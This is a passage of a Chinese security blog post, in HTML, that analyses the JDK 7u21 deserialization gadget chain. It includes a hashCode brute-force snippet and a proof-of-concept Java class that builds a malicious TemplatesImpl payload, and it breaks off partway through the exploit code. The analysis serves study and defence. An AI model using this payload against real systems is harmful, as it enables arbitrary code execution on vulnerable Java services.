@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Java反序列化漏洞系列-5 - Geekby&#39;s Blog</title><meta name="Description" content="7U21 Gadget 分析"><meta property="og:title" content="Java反序列化漏洞系列-5" />
+<meta property="og:description" content="7U21 Gadget 分析" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-01T11:00:00+08:00" />
+<meta property="article:modified_time" content="2021-09-01T11:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Java反序列化漏洞系列-5"/>
+<meta name="twitter:description" content="7U21 Gadget 分析"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5/" /><link rel="prev" href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/" /><link rel="next" href="https://www.geekby.site/2021/09/webshell%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Java反序列化漏洞系列-5",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2021\/09\/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "代码审计","wordcount":  627 ,
+        "url": "https:\/\/www.geekby.site\/2021\/09\/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-5\/","datePublished": "2021-09-01T11:00:00+08:00","dateModified": "2021-09-01T11:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "7U21 Gadget 分析"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Java反序列化漏洞系列-5</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw"></i>代码审计</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-09-01">2021-09-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 627 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-原理">1 原理</a></li>
+    <li><a href="#2-构造">2 构造</a></li>
+    <li><a href="#3-调用链">3 调用链</a></li>
+    <li><a href="#4-总结">4 总结</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="jdk-7u21-gadget">JDK 7U21 Gadget</h1>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw"></i>问题<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">前面的文章中介绍的都是利用第三方库的反序列化利用链。没有合适的第三方库存在时，Java 反序列化是否还能利用。</div>
+        </div>
+    </div>
+<p>首先，存在不依赖第三方库的 Java 反序列化利用链，但是，Java 新版本没有这样的问题。</p>
+<h2 id="1-原理">1 原理</h2>
+<p>JDK7u21 的核心点是 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> ，这个类在之前的分析中提到过。在 <code>AnnotationInvocationHandler</code> 类中有个 <code>equalsImpl</code> 方法:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011129205.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011129205.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011129205.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011129205.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011129205.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011129205.png-water_print" /></p>
+<p>反射调用：<code>memberMethod.invoke(o)</code> ，而 <code>memberMethod</code> 来自于 <code>this.type.getDeclaredMethods()</code> 。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011135011.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011135011.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011135011.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011135011.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011135011.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011135011.png-water_print" /></p>
+<p>也就是说， <code>equalsImpl</code> 这个方法是将 <code>this.type</code> 类中的所有方法遍历并执行了。那么，假设 <code>this.type</code> 是 <code>Templates</code> 类，则势必会调用到其中的 <code>newTransformer()</code> 或 <code>getOutputProperties()</code> 方法，进而触发任意代码执行。这就是 JDK7u21 的核心原理。</p>
+<h2 id="2-构造">2 构造</h2>
+<p>现在的思路就是通过反序列化调用 <code>equalsImpl</code> ， <code>equalsImpl</code> 是一个私有方法，在 <code>AnnotationInvocationHandler#invoke</code> 中被调用：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011138481.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011138481.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011138481.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011138481.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011138481.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011138481.png-water_print" /></p>
+<p><code>InvocationHandler</code> 是一个接口，只有一个方法就是 <code>invoke</code>。</p>
+<p>前面的文章提到过，在使用 <code>java.reflect.Proxy</code> 动态绑定一个接口时，如果调用该接口中任意一个方法，会执行到 <code>InvocationHandler#invoke</code>。执行 <code>invoke</code> 时，被传入的第一个参数是这个 <code>proxy</code> 对象，第二个参数是被执行的方法名，第三个参数是执行时的参数列表。</p>
+<p>而 <code>AnnotationInvocationHandler</code> 就是一个 <code>InvocationHandler</code> 接口的实现，它的 <code>invoke</code> 方法:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011146720.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011146720.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011146720.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011146720.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011146720.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011146720.png-water_print" /></p>
+<p>可见，当方法名等于 <code>equals</code>，且仅有一个 <code>Object</code> 类型参数时，会调用到 <code>equalImpl</code> 方法。 所以，现在的问题变成，找到一个方法，在反序列化时对 <code>proxy</code> 调用 <code>equals</code> 方法。</p>
+<h2 id="3-调用链">3 调用链</h2>
+<p>在比较 Java 对象时，常用到两种方法：</p>
+<ul>
+<li>equals</li>
+<li>compareTo</li>
+</ul>
+<p>任意 Java 对象都拥有 <code>equals</code> 方法，它通常用于比较两个对象是否是同一个引用。另一个常见的会调用 <code>equals</code> 的场景就是集合 <code>set</code>。<code>set</code> 中储存的对象不允许重复，所以在添加对象的时候，势必会涉及到比较操作。</p>
+<p>HashSet 的 readObject 方法:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011151879.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011151879.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011151879.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011151879.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011151879.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011151879.png-water_print" /></p>
+<p>这里使用了一个 HashMap，将对象保存在 HashMap 的 key 处来做去重。</p>
+<p>跟进 HashMap 的 put 方法：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011153259.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011153259.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011153259.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011153259.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011153259.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011153259.png-water_print" /></p>
+<p>变量 <code>i</code> 就是哈希值。两个不同的对象的 <code>i</code> 相等时，才会执行到 <code>key.equals(k)</code> ，触发前面说过的代码执行。</p>
+<p>接下来的思路就是为了让 proxy 对象的哈希，等于 TemplateImpl 对象的哈希。</p>
+<p>计算哈希的主要是下面这两行代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kt">int</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">hash</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">indexFor</span><span class="o">(</span><span class="n">hash</span><span class="o">,</span> <span class="n">table</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>将其中的关键逻辑提取出来，可以得到下面这个函数:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="nf">hash</span><span class="o">(</span><span class="n">Object</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+    <span class="kt">int</span> <span class="n">h</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
+    <span class="n">h</span> <span class="o">^=</span> <span class="n">key</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
+    <span class="n">h</span> <span class="o">^=</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">20</span><span class="o">)</span> <span class="o">^</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">12</span><span class="o">);</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">h</span> <span class="o">^</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">7</span><span class="o">)</span> <span class="o">^</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">4</span><span class="o">);</span>
+    <span class="k">return</span> <span class="n">h</span> <span class="o">&amp;</span> <span class="n">15</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>除了 <code>key.hashCode()</code> 外再没有其他变量，所以 <code>proxy</code> 对象与 <code>TemplateImpl</code> 对象的哈希是否相等，仅取决于这两个对象的 <code>hashCode()</code> 返回值是否相等。<code>TemplateImpl</code> 的 <code>hashCode()</code> 是一个Native 方法，每次运行都会发生变化，理论上是无法预测的，所以想让 <code>proxy</code> 的 <code>hashCode()</code> 与之相等，只能通过 <code>proxy.hashCode()</code> 。</p>
+<p><code>proxy.hashCode()</code> 仍然会调用到 <code>AnnotationInvocationHandler#invoke</code> ，进而调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code> ，跟进这个方法:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011157332.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011157332.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011157332.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011157332.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011157332.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202109011157332.png-water_print" /></p>
+<p>遍历这个 Map 中的每个 key 和 value，计算每个 <code>(127 * key.hashCode()) ^ value.hashCode()</code> 并求和。</p>
+<p>JDK7u21 中使用了一个非常巧妙的方法：</p>
+<ul>
+<li>当 <code>memberValues</code> 中只有一个 key 和一个 value 时，该哈希简化成 <code>(127 * key.hashCode()) ^ value.hashCode()</code></li>
+<li>当 <code>key.hashCode()==0</code> 时，任何数异或 0 的结果仍是它本身，所以该哈希简化成 <code>value.hashCode()</code></li>
+<li>当 <code>value</code> 就是 <code>TemplateImpl</code> 时，这两个哈希就变成完全相等</li>
+</ul>
+<p>因此，通过寻找一个 hashCode 是 0 的对象作为的 key，将恶意 TemplateImpl 对象作为 value，这个 proxy 计算的 hashCode 就与 TemplateImpl 对象本身的 hashCode 相等了。</p>
+<p>找一个 hashCode 是 0 的对象，通过一个简单的爆破程序来实现：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">bruteHashCode</span><span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">for</span> <span class="o">(</span><span class="kt">long</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">9999999999L</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">Long</span><span class="o">.</span><span class="na">toHexString</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Long</span><span class="o">.</span><span class="na">toHexString</span><span class="o">(</span><span class="n">i</span><span class="o">));</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>第一个结果是 <code>f5a5a608</code>，这个也是 ysoserial 中用到的字符串。</p>
+<h2 id="4-总结">4 总结</h2>
+<p>按照如下步骤来构造：</p>
+<ul>
+<li>生成恶意 <code>TemplateImpl</code> 对象</li>
+<li>实例化 <code>AnnotationInvocationHandler</code> 对象
+<ul>
+<li>type 属性是 <code>TemplateImpl</code> 类</li>
+<li>memberValues 属性是一个 Map，Map 只有一个 key 和 value，key 是字符串 ， value 是前面生成的恶意 <code>TemplateImpl</code> 对象</li>
+</ul>
+</li>
+<li>对这个 <code>AnnotationInvocationHandler</code> 对象做一层代理，生成 proxy 对象</li>
+<li>实例化一个 HashSet，这个 HashSet 有两个元素，分别是：
+<ul>
+<li><code>TemplateImpl</code> 对象</li>
+<li><code>proxy</code> 对象</li>
+</ul>
+</li>
+<li>将 HashSet 对象进行序列化</li>
+</ul>
+<p>反序列化触发代码执行的流程如下：</p>
+<ul>
+<li>触发 HashSet 的 readObject 方法，其中使用 HashMap 的 key 做去重</li>
+<li>去重时计算 HashSet 中的两个元素的 <code>hashCode</code> ，通过构造二者相等，进而触发 <code>equals()</code> 方法</li>
+<li>调用 <code>AnnotationInvocationHandler#equalsImpl</code> 方法</li>
+<li><code>equalsImpl</code> 中遍历 <code>this.type</code> 的每个方法并调用</li>
+<li><code>this.type</code> 是 <code>TemplatesImpl</code> 类，所以触发了 <code>newTransform()</code> 或 <code>getOutputProperties()</code> 方法</li>
+<li>任意代码执行</li>
+</ul>
+<p>POC 如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">main.java</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.LinkedHashSet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OriginalGadgetDemo</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;/Volumes/MacOS/WorkSpace/JAVA/7u21Gadget/src/main/java/EvilTemplatesImpl.class&#34;</span><span class="o">));</span>
+        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">code</span><span class="o">});</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+
+        <span class="n">String</span> <span class="n">zeroHashCodeStr</span> <span class="o">=</span> <span class="s">&#34;f5a5a608&#34;</span><span class="o">;</span>
+
+        <span class="c1">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
+</span><span class="c1"></span>        <span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="s">&#34;foo&#34;</span><span class="o">);</span>
+
+        <span class="c1">// 实例化AnnotationInvocationHandler类
+</span><span class="c1"></span>        <span class="n">Constructor</span> <span class="n">handlerConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">handlerConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">handlerConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
+
+        <span class="c1">// 为tempHandler创造一层代理
